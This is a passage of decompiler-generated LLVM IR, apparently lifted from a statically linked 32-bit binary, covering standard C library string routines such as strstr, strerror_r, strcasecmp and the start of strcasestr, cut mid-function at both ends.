  br i1 %v2_15210, label %dec_label_pc_15258, label %dec_label_pc_15218

dec_label_pc_15218:                               ; preds = %dec_label_pc_15204
  %v2_15218 = inttoptr i32 %v0_151cc39 to i8*
  %v3_15218 = load i8, i8* %v2_15218, align 1
  %v2_15220 = icmp eq i8 %v3_15218, 0
  %v1_15224 = add i32 %v0_151cc39, 1
  br i1 %v2_15220, label %dec_label_pc_151cc, label %dec_label_pc_1522c

dec_label_pc_1522c:                               ; preds = %dec_label_pc_15218
  %v2_1522c = inttoptr i32 %v1_15224 to i8*
  %v3_1522c = load i8, i8* %v2_1522c, align 1
  %v2_15230 = icmp eq i8 %v3_1522c, 0
  br i1 %v2_15230, label %dec_label_pc_1526c, label %dec_label_pc_15238

dec_label_pc_15238:                               ; preds = %dec_label_pc_1522c
  %v1_15238 = add i32 %v0_151cc39, 2
  %v2_15238 = inttoptr i32 %v1_15238 to i8*
  %v3_15238 = load i8, i8* %v2_15238, align 1
  %v2_1523c = icmp eq i8 %v3_15238, 0
  br i1 %v2_1523c, label %dec_label_pc_1526c, label %dec_label_pc_15248

dec_label_pc_15248:                               ; preds = %dec_label_pc_15238
  %v1_15248 = add i32 %v0_151cc39, 3
  %v2_15248 = inttoptr i32 %v1_15248 to i8*
  %v3_15248 = load i8, i8* %v2_15248, align 1
  %v2_1524c = icmp eq i8 %v3_15248, 0
  br i1 %v2_1524c, label %dec_label_pc_1526c, label %dec_label_pc_15258

dec_label_pc_15258:                               ; preds = %dec_label_pc_15248, %dec_label_pc_15204
  %v3_1525c = icmp ult i32 %v4_15204, %v5_15270
  br i1 %v3_1525c, label %dec_label_pc_15204, label %dec_label_pc_1526c

dec_label_pc_1526c:                               ; preds = %dec_label_pc_15258, %dec_label_pc_151fc, %dec_label_pc_1522c, %dec_label_pc_15238, %dec_label_pc_15248, %dec_label_pc_151cc
  %v1_1526c = phi i32 [ %v0_151cc39, %dec_label_pc_151cc ], [ %storemerge.lcssa, %dec_label_pc_151fc ], [ %v1_15224, %dec_label_pc_1522c ], [ %v1_15238, %dec_label_pc_15238 ], [ %v1_15248, %dec_label_pc_15248 ], [ %v5_15270, %dec_label_pc_15258 ]
  %v3_1526c = icmp uge i32 %v5_15270, %v1_1526c
  %v9_1526c = icmp eq i32 %v5_15270, %v1_1526c
  %v2_15270 = xor i1 %v3_1526c, true
  %v3_15270 = or i1 %v9_1526c, %v2_15270
  br i1 %v3_15270, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_1526c
  %v6_15270 = sub i32 %v5_15270, %tmp
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_1526c, %bb25
  %v5_15274 = phi i32 [ %v1_1526c, %dec_label_pc_1526c ], [ %v6_15270, %bb25 ]
  %v2_15274 = xor i1 %v9_1526c, true
  %v3_15274 = and i1 %v3_1526c, %v2_15274
  br i1 %v3_15274, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v6_15274 = sub i32 %v5_15274, %tmp
  br label %bb28

bb28:                                             ; preds = %bb26, %bb27
  %v8_15278 = phi i32 [ %v5_15274, %bb26 ], [ %v6_15274, %bb27 ]
  ret i32 %v8_15278

; uselistorder directives
  uselistorder i1 %v3_1526c, { 1, 0 }
  uselistorder i32 %v4_15204, { 1, 2, 0 }
  uselistorder i32 %v0_151cc39, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_151f0, { 1, 0, 2 }
  uselistorder i32 %v1_151bc, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_15270, { 3, 4, 5, 0, 2, 1, 8, 7, 6 }
  uselistorder i1 %v3_151bc, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 5, 7, 8, 0, 6, 2, 1 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_1526c, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_151e4, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  %v6_15284 = load i32, i32* @r5, align 4
  %v9_15284 = load i32, i32* @r6, align 4
  %v3_15288 = load i8, i8* %arg2, align 1
  %v2_1528c = icmp eq i8 %v3_15288, 0
  br i1 %v2_1528c, label %bb, label %bb50

bb:                                               ; preds = %entry
  ret i32 %arg1

bb50:                                             ; preds = %entry
  %v1_15294 = add i32 %arg1, -1
  br label %dec_label_pc_15298

dec_label_pc_15298:                               ; preds = %dec_label_pc_152a4, %bb50
  %v0_15298 = phi i32 [ %v1_15298, %dec_label_pc_152a4 ], [ %v1_15294, %bb50 ]
  %v1_15298 = add i32 %v0_15298, 1
  %v2_15298 = inttoptr i32 %v1_15298 to i8*
  %v3_15298 = load i8, i8* %v2_15298, align 1
  %v2_1529c = icmp eq i8 %v3_15298, 0
  br i1 %v2_1529c, label %dec_label_pc_15374, label %dec_label_pc_152a4

dec_label_pc_152a4:                               ; preds = %dec_label_pc_15298
  %v9_152a4 = icmp eq i8 %v3_15298, %v3_15288
  br i1 %v9_152a4, label %dec_label_pc_152ac, label %dec_label_pc_15298

dec_label_pc_152ac:                               ; preds = %dec_label_pc_152a4
  %v2_152ac = add i32 %tmp, 1
  %v3_152ac = inttoptr i32 %v2_152ac to i8*
  %v4_152ac = load i8, i8* %v3_152ac, align 1
  %v2_152b0 = icmp eq i8 %v4_152ac, 0
  br i1 %v2_152b0, label %bb51, label %bb52

bb51:                                             ; preds = %dec_label_pc_152ac
  store i32 %v6_15284, i32* @r5, align 4
  store i32 %v9_15284, i32* @r6, align 4
  ret i32 %v1_15298

bb52:                                             ; preds = %dec_label_pc_152ac
  %v1_152bc = add i32 %v0_15298, 2
  %v1_15310 = add i32 %tmp, 2
  %v2_15310 = inttoptr i32 %v1_15310 to i8*
  br label %dec_label_pc_15308

dec_label_pc_152cc:                               ; preds = %dec_label_pc_15368
  %v3_152cc = load i8, i8* %v3_15300.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  br label %dec_label_pc_152f8.preheader

dec_label_pc_152f8.preheader:                     ; preds = %dec_label_pc_152cc, %dec_label_pc_15308
  %v0_152f84.in = phi i8 [ %v3_152cc, %dec_label_pc_152cc ], [ %v3_15300.pn, %dec_label_pc_15308 ]
  %v9_152f813 = icmp eq i8 %v0_152f84.in, %v3_15288
  br i1 %v9_152f813, label %dec_label_pc_15300, label %dec_label_pc_152d8

dec_label_pc_152d8:                               ; preds = %dec_label_pc_152f8.preheader, %dec_label_pc_152f4
  %v0_152e0 = phi i32 [ %v1_152f4, %dec_label_pc_152f4 ], [ %storemerge43, %dec_label_pc_152f8.preheader ]
  %v0_152d8.in = phi i8 [ %v3_152f4, %dec_label_pc_152f4 ], [ %v0_152f84.in, %dec_label_pc_152f8.preheader ]
  %v2_152d8 = icmp eq i8 %v0_152d8.in, 0
  br i1 %v2_152d8, label %dec_label_pc_15374, label %dec_label_pc_152e0

dec_label_pc_152e0:                               ; preds = %dec_label_pc_152d8
  %v1_152e0 = add i32 %v0_152e0, 1
  %v2_152e0 = inttoptr i32 %v1_152e0 to i8*
  %v3_152e0 = load i8, i8* %v2_152e0, align 1
  store i32 %v1_152e0, i32* @ip, align 4
  %v9_152e4 = icmp eq i8 %v3_152e0, %v3_15288
  br i1 %v9_152e4, label %dec_label_pc_15300, label %dec_label_pc_152ec

dec_label_pc_152ec:                               ; preds = %dec_label_pc_152e0
  %v2_152ec = icmp eq i8 %v3_152e0, 0
  br i1 %v2_152ec, label %dec_label_pc_15374, label %dec_label_pc_152f4

dec_label_pc_152f4:                               ; preds = %dec_label_pc_152ec
  %v1_152f4 = add i32 %v0_152e0, 2
  %v2_152f4 = inttoptr i32 %v1_152f4 to i8*
  %v3_152f4 = load i8, i8* %v2_152f4, align 1
  store i32 %v1_152f4, i32* @ip, align 4
  %v9_152f8 = icmp eq i8 %v3_152f4, %v3_15288
  br i1 %v9_152f8, label %dec_label_pc_15300, label %dec_label_pc_152d8

dec_label_pc_15300:                               ; preds = %dec_label_pc_152e0, %dec_label_pc_152f4, %dec_label_pc_152f8.preheader
  %v0_15300 = phi i32 [ %storemerge43, %dec_label_pc_152f8.preheader ], [ %v1_152e0, %dec_label_pc_152e0 ], [ %v1_152f4, %dec_label_pc_152f4 ]
  %v1_15300 = add i32 %v0_15300, 1
  br label %dec_label_pc_15308

dec_label_pc_15308:                               ; preds = %bb52, %dec_label_pc_15300
  %storemerge43 = phi i32 [ %v1_15300, %dec_label_pc_15300 ], [ %v1_152bc, %bb52 ]
  %v3_15300.pn.in = inttoptr i32 %storemerge43 to i8*
  %v3_15300.pn = load i8, i8* %v3_15300.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  %storemerge = icmp eq i8 %v3_15300.pn, %v4_152ac
  br i1 %storemerge, label %dec_label_pc_1530c, label %dec_label_pc_152f8.preheader

dec_label_pc_1530c:                               ; preds = %dec_label_pc_15308
  %v1_1530c = add i32 %storemerge43, 1
  %v2_1530c = inttoptr i32 %v1_1530c to i8*
  %v3_1530c = load i8, i8* %v2_1530c, align 1
  %v4_1530c = zext i8 %v3_1530c to i32
  %v3_15310 = load i8, i8* %v2_15310, align 1
  %v4_15310 = zext i8 %v3_15310 to i32
  %v1_15314 = add i32 %storemerge43, -1
  %v9_15318 = icmp eq i8 %v3_1530c, %v3_15310
  store i32 %v1_15310, i32* @lr, align 4
  store i32 %v1_1530c, i32* @ip, align 4
  br i1 %v9_15318, label %dec_label_pc_15328, label %dec_label_pc_15368

dec_label_pc_15328:                               ; preds = %dec_label_pc_1530c, %dec_label_pc_15324
  %v0_15340 = phi i32 [ %v1_15348, %dec_label_pc_15324 ], [ %v1_15310, %dec_label_pc_1530c ]
  %v0_15338 = phi i32 [ %v1_15344, %dec_label_pc_15324 ], [ %v1_1530c, %dec_label_pc_1530c ]
  %v0_15328 = phi i32 [ %v4_15358, %dec_label_pc_15324 ], [ %v4_1530c, %dec_label_pc_1530c ]
  %v2_15328 = icmp eq i32 %v0_15328, 0
  br i1 %v2_15328, label %bb53, label %bb54

bb53:                                             ; preds = %dec_label_pc_15328
  store i32 %v6_15284, i32* @r5, align 4
  store i32 %v9_15284, i32* @r6, align 4
  ret i32 %v1_15314

bb54:                                             ; preds = %dec_label_pc_15328
  %v1_15330 = add i32 %v0_15338, 1
  %v2_15330 = inttoptr i32 %v1_15330 to i8*
  %v3_15330 = load i8, i8* %v2_15330, align 1
  %v1_15334 = add i32 %v0_15340, 1
  %v2_15334 = inttoptr i32 %v1_15334 to i8*
  %v3_15334 = load i8, i8* %v2_15334, align 1
  %v4_15334 = zext i8 %v3_15334 to i32
  store i32 %v1_15330, i32* @r1, align 4
  %v9_1533c = icmp eq i8 %v3_15330, %v3_15334
  %v1_15344 = add i32 %v0_15338, 2
  store i32 %v1_15344, i32* @ip, align 4
  %v1_15348 = add i32 %v0_15340, 2
  store i32 %v1_15348, i32* @lr, align 4
  br i1 %v9_1533c, label %dec_label_pc_15350, label %dec_label_pc_15368

dec_label_pc_15350:                               ; preds = %bb54
  %v2_15350 = icmp eq i8 %v3_15330, 0
  br i1 %v2_15350, label %bb55, label %dec_label_pc_15324

bb55:                                             ; preds = %dec_label_pc_15350
  store i32 %v6_15284, i32* @r5, align 4
  store i32 %v9_15284, i32* @r6, align 4
  ret i32 %v1_15314

dec_label_pc_15324:                               ; preds = %dec_label_pc_15350
  %v2_15358 = inttoptr i32 %v1_15348 to i8*
  %v3_15358 = load i8, i8* %v2_15358, align 1
  %v4_15358 = zext i8 %v3_15358 to i32
  %v2_1535c = inttoptr i32 %v1_15344 to i8*
  %v3_1535c = load i8, i8* %v2_1535c, align 1
  %v9_15360 = icmp eq i8 %v3_1535c, %v3_15358
  br i1 %v9_15360, label %dec_label_pc_15328, label %dec_label_pc_15368

dec_label_pc_15368:                               ; preds = %dec_label_pc_15324, %bb54, %dec_label_pc_1530c
  %v0_15368 = phi i32 [ %v4_15310, %dec_label_pc_1530c ], [ %v4_15358, %dec_label_pc_15324 ], [ %v4_15334, %bb54 ]
  %v2_15368 = icmp eq i32 %v0_15368, 0
  br i1 %v2_15368, label %dec_label_pc_15370, label %dec_label_pc_152cc

dec_label_pc_15370:                               ; preds = %dec_label_pc_15368
  store i32 %v6_15284, i32* @r5, align 4
  store i32 %v9_15284, i32* @r6, align 4
  ret i32 %v1_15314

dec_label_pc_15374:                               ; preds = %dec_label_pc_15298, %dec_label_pc_152ec, %dec_label_pc_152d8
  store i32 %v6_15284, i32* @r5, align 4
  store i32 %v9_15284, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_15348, { 0, 2, 1 }
  uselistorder i32 %v1_15344, { 1, 2, 0 }
  uselistorder i32 %v1_15314, { 2, 1, 0 }
  uselistorder i8 %v3_15300.pn, { 1, 0 }
  uselistorder i8* %v3_15300.pn.in, { 1, 0 }
  uselistorder i32 %storemerge43, { 4, 2, 6, 1, 3, 0, 5 }
  uselistorder i8 %v3_152f4, { 1, 0 }
  uselistorder i32 %v1_152f4, { 0, 2, 3, 1 }
  uselistorder i32 %v1_15298, { 0, 2, 1 }
  uselistorder i8 %v3_15288, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_15284, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v6_15284, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_15374, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15328, { 1, 0 }
  uselistorder label %dec_label_pc_15308, { 1, 0 }
  uselistorder label %dec_label_pc_15300, { 1, 0, 2 }
  uselistorder label %dec_label_pc_152d8, { 1, 0 }
  uselistorder label %dec_label_pc_152f8.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_15384 = call i32 @__xpg_strerror_r()
  %v0_15388 = load i32, i32* @r4, align 4
  ret i32 %v0_15388
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_15390 = load i32, i32* @r4, align 4
  %v0_15394 = load i32, i32* @r0, align 4
  %v0_153a0 = load i32, i32* @r1, align 4
  store i32 %v0_153a0, i32* @r8, align 4
  %v0_153a4 = load i32, i32* @r2, align 4
  store i32 %v0_153a4, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_15394, 125
  br i1 %tmp, label %thread-pre-split.preheader, label %dec_label_pc_153dc

thread-pre-split.preheader:                       ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_1d304.955 to i32), i32* @r5, align 4
  %v2_153c43446 = icmp eq i32 %v0_15394, 0
  br i1 %v2_153c43446, label %bb26, label %dec_label_pc_153b8.lr.ph

dec_label_pc_153b8:                               ; preds = %dec_label_pc_153b8.lr.ph, %bb
  %v2_153d041 = phi i1 [ %v2_153d03849, %dec_label_pc_153b8.lr.ph ], [ %v2_153d0, %bb ]
  %v1_153d440 = phi i32 [ %v0_153c4.pr48, %dec_label_pc_153b8.lr.ph ], [ %v2_153c0, %bb ]
  %v0_153bc39 = phi i32 [ %v0_153c8547, %dec_label_pc_153b8.lr.ph ], [ %v1_153bc, %bb ]
  %v1_153bc = add i32 %v0_153bc39, 1
  store i32 %v1_153bc, i32* @r5, align 4
  br i1 %v2_153d041, label %bb, label %thread-pre-split.loopexit

bb:                                               ; preds = %dec_label_pc_153b8
  %v2_153c0 = add i32 %v1_153d440, -1
  %v2_153c4 = icmp eq i32 %v2_153c0, 0
  %v1_153c8 = inttoptr i32 %v1_153bc to i8*
  %v2_153c8 = load i8, i8* %v1_153c8, align 1
  %v2_153d0 = icmp eq i8 %v2_153c8, 0
  br i1 %v2_153c4, label %dec_label_pc_153d0, label %dec_label_pc_153b8

thread-pre-split.loopexit:                        ; preds = %dec_label_pc_153b8
  %v1_153c835 = inttoptr i32 %v1_153bc to i8*
  %v2_153c836 = load i8, i8* %v1_153c835, align 1
  %v2_153d038 = icmp eq i8 %v2_153c836, 0
  br label %dec_label_pc_153b8.lr.ph

dec_label_pc_153b8.lr.ph:                         ; preds = %thread-pre-split.loopexit, %thread-pre-split.preheader
  %v2_153d03849 = phi i1 [ %v2_153d038, %thread-pre-split.loopexit ], [ false, %thread-pre-split.preheader ]
  %v0_153c4.pr48 = phi i32 [ %v1_153d440, %thread-pre-split.loopexit ], [ %v0_15394, %thread-pre-split.preheader ]
  %v0_153c8547 = phi i32 [ %v1_153bc, %thread-pre-split.loopexit ], [ ptrtoint ([8 x i8]* @global_var_1d304.955 to i32), %thread-pre-split.preheader ]
  br label %dec_label_pc_153b8

dec_label_pc_153d0:                               ; preds = %bb
  br i1 %v2_153d0, label %dec_label_pc_153dc, label %bb26

bb26:                                             ; preds = %thread-pre-split.preheader, %dec_label_pc_153d0
  %v0_153bc.lcssa55 = phi i32 [ %v1_153bc, %dec_label_pc_153d0 ], [ ptrtoint ([8 x i8]* @global_var_1d304.955 to i32), %thread-pre-split.preheader ]
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15410

dec_label_pc_153dc:                               ; preds = %dec_label_pc_153d0, %entry
  %v3_153e0 = ashr i32 %v0_15394, 31
  %v5_153f4 = bitcast i32* %stack_var_-25 to i8*
  %v6_153f4 = call i32 @_uintmaxtostr(i8* %v5_153f4, i32 %v0_15394, i32 %v3_153e0, i32 -10, i32 0)
  %v1_153f8 = add i32 %v6_153f4, -14
  store i32 %v1_153f8, i32* @r5, align 4
  store i32 %v1_153f8, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1d2f4.957 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_15408 = call i32 @memcpy()
  store i32 22, i32* %r7.global-to-local, align 4
  %v0_15410.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15410

dec_label_pc_15410:                               ; preds = %bb26, %dec_label_pc_153dc
  %v0_15410 = phi i32 [ %v0_153bc.lcssa55, %bb26 ], [ %v0_15410.pre, %dec_label_pc_153dc ]
  %v1_15410 = inttoptr i32 %v0_15410 to i8*
  %v3_15414 = call i32 @strlen(i8* %v1_15410)
  %v0_15418 = load i32, i32* @r8, align 4
  %v2_15418 = icmp eq i32 %v0_15418, 0
  %v1_1541c = add i32 %v3_15414, 1
  store i32 %v1_1541c, i32* @r4, align 4
  br i1 %v2_15418, label %bb27, label %dec_label_pc_15410._crit_edge

dec_label_pc_15410._crit_edge:                    ; preds = %dec_label_pc_15410
  %v1_15424.pre = load i32, i32* @r6, align 4
  br label %bb28

bb27:                                             ; preds = %dec_label_pc_15410
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_15410._crit_edge, %bb27
  %v4_15428 = phi i32 [ %v1_15424.pre, %dec_label_pc_15410._crit_edge ], [ 0, %bb27 ]
  %tmp56 = icmp ugt i32 %v1_1541c, %v4_15428
  br i1 %tmp56, label %bb29, label %.thread16

bb29:                                             ; preds = %bb28
  store i32 %v4_15428, i32* @r4, align 4
  store i32 34, i32* %r7.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %bb28, %bb29
  %v0_1543814 = phi i32 [ %v4_15428, %bb29 ], [ %v1_1541c, %bb28 ]
  %v2_15430 = icmp eq i32 %v0_1543814, 0
  br i1 %v2_15430, label %dec_label_pc_15454, label %dec_label_pc_15438

dec_label_pc_15438:                               ; preds = %.thread16
  store i32 %v0_1543814, i32* @r2, align 4
  %v0_1543c = load i32, i32* @r5, align 4
  store i32 %v0_1543c, i32* @r1, align 4
  store i32 %v0_15418, i32* @r0, align 4
  %v0_15444 = call i32 @memcpy()
  %v0_15448 = load i32, i32* @r8, align 4
  %v1_15448 = load i32, i32* @r4, align 4
  %v2_15448 = add i32 %v1_15448, %v0_15448
  %v3_15450 = add i32 %v2_15448, -1
  %v4_15450 = inttoptr i32 %v3_15450 to i8*
  store i8 0, i8* %v4_15450, align 1
  br label %dec_label_pc_15454

dec_label_pc_15454:                               ; preds = %.thread16, %dec_label_pc_15438
  %v0_15454 = load i32, i32* %r7.global-to-local, align 4
  %v2_15454 = icmp eq i32 %v0_15454, 0
  br i1 %v2_15454, label %dec_label_pc_15464, label %dec_label_pc_1545c

dec_label_pc_1545c:                               ; preds = %dec_label_pc_15454
  %v0_1545c = call i32 @__errno_location()
  %v0_15460 = load i32, i32* %r7.global-to-local, align 4
  %v2_15460 = inttoptr i32 %v0_1545c to i32*
  store i32 %v0_15460, i32* %v2_15460, align 4
  %v0_15464.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15464

dec_label_pc_15464:                               ; preds = %dec_label_pc_15454, %dec_label_pc_1545c
  %v0_15464 = phi i32 [ 0, %dec_label_pc_15454 ], [ %v0_15464.pre, %dec_label_pc_1545c ]
  store i32 %v3_15390, i32* @r4, align 4
  ret i32 %v0_15464

; uselistorder directives
  uselistorder i32 %v4_15428, { 1, 2, 0 }
  uselistorder i32 %v1_1541c, { 1, 0, 2 }
  uselistorder i32 %v1_153bc, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_15394, { 4, 3, 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder label %dec_label_pc_15464, { 1, 0 }
  uselistorder label %dec_label_pc_15454, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_15410, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @lr, align 4
  br label %dec_label_pc_15488

dec_label_pc_15488:                               ; preds = %bb8, %entry
  %v8_154ec3 = phi i32 [ %v8_154ec, %bb8 ], [ 0, %entry ]
  %v0_154e0 = phi i32 [ %v1_154e0, %bb8 ], [ %arg2, %entry ]
  %v0_154e4 = phi i32 [ %v1_154e4, %bb8 ], [ %tmp, %entry ]
  %v9_15488 = icmp eq i32 %v0_154e4, %v0_154e0
  br i1 %v9_15488, label %dec_label_pc_15488._crit_edge, label %dec_label_pc_15490

dec_label_pc_15488._crit_edge:                    ; preds = %dec_label_pc_15488
  %.pre = inttoptr i32 %v0_154e0 to i8*
  br label %bb8

dec_label_pc_15490:                               ; preds = %dec_label_pc_15488
  %v1_15494 = inttoptr i32 %v0_154e4 to i8*
  %v2_15494 = load i8, i8* %v1_15494, align 1
  %v3_15494 = zext i8 %v2_15494 to i32
  %v1_15498 = inttoptr i32 %v0_154e0 to i8*
  %v2_15498 = load i8, i8* %v1_15498, align 1
  %v3_15498 = zext i8 %v2_15498 to i32
  %v2_1549c = load i32, i32* bitcast (i32** @global_var_26824.960 to i32*), align 4
  %v2_154a0 = mul nuw nsw i32 %v3_15494, 2
  %v2_154a4 = mul nuw nsw i32 %v3_15498, 2
  %v2_154a8 = add i32 %v2_154a4, %v2_1549c
  %v2_154ac = add i32 %v2_1549c, %v2_154a0
  %v1_154b0 = add i32 %v2_154ac, 1
  %v2_154b0 = inttoptr i32 %v1_154b0 to i8*
  %v3_154b0 = load i8, i8* %v2_154b0, align 1
  %v4_154b0 = zext i8 %v3_154b0 to i32
  %v1_154b4 = add i32 %v2_154a8, 1
  %v2_154b4 = inttoptr i32 %v1_154b4 to i8*
  %v3_154b4 = load i8, i8* %v2_154b4, align 1
  %v4_154b4 = zext i8 %v3_154b4 to i32
  %v3_154b8 = inttoptr i32 %v2_154a8 to i8*
  %v4_154b8 = load i8, i8* %v3_154b8, align 1
  %v6_154b8 = zext i8 %v4_154b8 to i32
  %v3_154bc = inttoptr i32 %v2_154ac to i8*
  %v4_154bc = load i8, i8* %v3_154bc, align 1
  %v6_154bc = zext i8 %v4_154bc to i32
  %v3_154c0 = mul nuw i32 %v4_154b4, 16777216
  %v3_154c4 = mul nuw i32 %v4_154b0, 16777216
  %v4_154c8 = sdiv i32 %v3_154c4, 65536
  %v5_154c8 = or i32 %v6_154bc, %v4_154c8
  %v4_154cc = sdiv i32 %v3_154c0, 65536
  %v5_154cc = or i32 %v4_154cc, %v6_154b8
  %v2_154d0 = sub nsw i32 %v5_154c8, %v5_154cc
  %v9_154d0 = icmp eq i32 %v5_154c8, %v5_154cc
  br i1 %v9_154d0, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_15490
  ret i32 %v2_154d0

bb8:                                              ; preds = %dec_label_pc_15488._crit_edge, %dec_label_pc_15490
  %v1_154d8.pre-phi = phi i8* [ %.pre, %dec_label_pc_15488._crit_edge ], [ %v1_15494, %dec_label_pc_15490 ]
  %v8_154ec = phi i32 [ %v8_154ec3, %dec_label_pc_15488._crit_edge ], [ %v2_154d0, %dec_label_pc_15490 ]
  %v2_154d8 = load i8, i8* %v1_154d8.pre-phi, align 1
  %v2_154dc = icmp eq i8 %v2_154d8, 0
  %v1_154e0 = add i32 %v0_154e0, 1
  %v1_154e4 = add i32 %v0_154e4, 1
  store i32 %v1_154e4, i32* @lr, align 4
  br i1 %v2_154dc, label %dec_label_pc_154ec, label %dec_label_pc_15488

dec_label_pc_154ec:                               ; preds = %bb8
  ret i32 %v8_154ec

; uselistorder directives
  uselistorder i32 %v1_154e4, { 1, 0 }
  uselistorder i32 %v2_154d0, { 1, 0 }
  uselistorder i32 %v5_154cc, { 1, 0 }
  uselistorder i32 %v5_154c8, { 1, 0 }
  uselistorder i32 %v0_154e0, { 1, 2, 0, 3 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v1_1550816 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_15508.outer

dec_label_pc_15508.outer:                         ; preds = %dec_label_pc_15570, %entry
  %v0_1551c.ph = phi i32 [ %v1_15570, %dec_label_pc_15570 ], [ %tmp, %entry ]
  %v2_1550817 = load i8, i8* %v1_1550816, align 1
  %v2_1550c19 = icmp eq i8 %v2_1550817, 0
  br i1 %v2_1550c19, label %dec_label_pc_1551c, label %dec_label_pc_15524

dec_label_pc_1551c:                               ; preds = %dec_label_pc_15508.backedge, %dec_label_pc_15508.outer
  ret i32 %v0_1551c.ph

dec_label_pc_15524:                               ; preds = %dec_label_pc_15508.outer, %dec_label_pc_15508.backedge
  %v1_1551425.in = phi i32 [ %v1_1551425, %dec_label_pc_15508.backedge ], [ %arg2, %dec_label_pc_15508.outer ]
  %v2_1550823 = phi i8 [ %v2_15508, %dec_label_pc_15508.backedge ], [ %v2_1550817, %dec_label_pc_15508.outer ]
  %v2_1551024.in.in = phi i8 [ %v2_15508, %dec_label_pc_15508.backedge ], [ %v2_1550817, %dec_label_pc_15508.outer ]
  %v0_1552c22 = phi i32 [ %v1_1552c, %dec_label_pc_15508.backedge ], [ %v0_1551c.ph, %dec_label_pc_15508.outer ]
  %v1_1551425 = add i32 %v1_1551425.in, 1
  %v1_15524 = inttoptr i32 %v0_1552c22 to i8*
  %v2_15524 = load i8, i8* %v1_15524, align 1
  %v9_15528 = icmp eq i8 %v2_1550823, %v2_15524
  %v1_1552c = add i32 %v0_1552c22, 1
  br i1 %v9_15528, label %dec_label_pc_15508.backedge, label %dec_label_pc_15538

dec_label_pc_15508.backedge:                      ; preds = %dec_label_pc_15524, %dec_label_pc_15538
  %v1_15508 = inttoptr i32 %v1_1551425 to i8*
  %v2_15508 = load i8, i8* %v1_15508, align 1
  %v2_1550c = icmp eq i8 %v2_15508, 0
  br i1 %v2_1550c, label %dec_label_pc_1551c, label %dec_label_pc_15524

dec_label_pc_15538:                               ; preds = %dec_label_pc_15524
  %v2_1551024.in = zext i8 %v2_1551024.in.in to i32
  %v3_15524 = zext i8 %v2_15524 to i32
  %v2_15530 = mul nuw nsw i32 %v3_15524, 2
  %v2_1551024 = mul nuw nsw i32 %v2_1551024.in, 2
  %v2_1553c = load i32, i32* bitcast (i32** @global_var_26824.960 to i32*), align 4
  %v2_15540 = add i32 %v2_1553c, %v2_15530
  %v2_15544 = add i32 %v2_1553c, %v2_1551024
  %v1_15548 = add i32 %v2_15544, 1
  %v2_15548 = inttoptr i32 %v1_15548 to i8*
  %v3_15548 = load i8, i8* %v2_15548, align 1
  %v4_15548 = zext i8 %v3_15548 to i32
  %v1_1554c = add i32 %v2_15540, 1
  %v2_1554c = inttoptr i32 %v1_1554c to i8*
  %v3_1554c = load i8, i8* %v2_1554c, align 1
  %v4_1554c = zext i8 %v3_1554c to i32
  %v3_15550 = inttoptr i32 %v2_15540 to i8*
  %v4_15550 = load i8, i8* %v3_15550, align 1
  %v6_15550 = zext i8 %v4_15550 to i32
  %v3_15554 = inttoptr i32 %v2_15544 to i8*
  %v4_15554 = load i8, i8* %v3_15554, align 1
  %v6_15554 = zext i8 %v4_15554 to i32
  %v3_15558 = mul nuw i32 %v4_15548, 16777216
  %v3_1555c = mul nuw i32 %v4_1554c, 16777216
  %v4_15560 = sdiv i32 %v3_15558, 65536
  %v5_15560 = or i32 %v6_15554, %v4_15560
  %v4_15564 = sdiv i32 %v3_1555c, 65536
  %v5_15564 = or i32 %v4_15564, %v6_15550
  %v9_15568 = icmp eq i32 %v5_15560, %v5_15564
  br i1 %v9_15568, label %dec_label_pc_15508.backedge, label %dec_label_pc_15570

dec_label_pc_15570:                               ; preds = %dec_label_pc_15538
